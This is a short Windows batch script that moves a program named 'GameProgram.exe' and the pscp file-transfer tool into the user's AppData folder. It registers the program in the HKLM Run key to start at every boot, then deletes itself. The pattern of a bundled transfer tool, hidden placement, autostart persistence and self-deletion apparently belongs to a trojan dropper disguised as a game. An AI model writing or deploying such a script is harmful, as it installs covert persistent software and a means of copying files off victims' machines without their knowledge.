@echo off
move /y "GameProgram.exe" "\Users\%USERNAME%\AppData\Local\GameProgram.exe"
move /y "pscp.exe" "\Users\%USERNAME%\AppData\Local\pscp.exe"
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v GameProgram /t reg_sz /d "/Users/%USERNAME%/AppData/Local/GameProgram.exe"
pause
DEL "%~f0"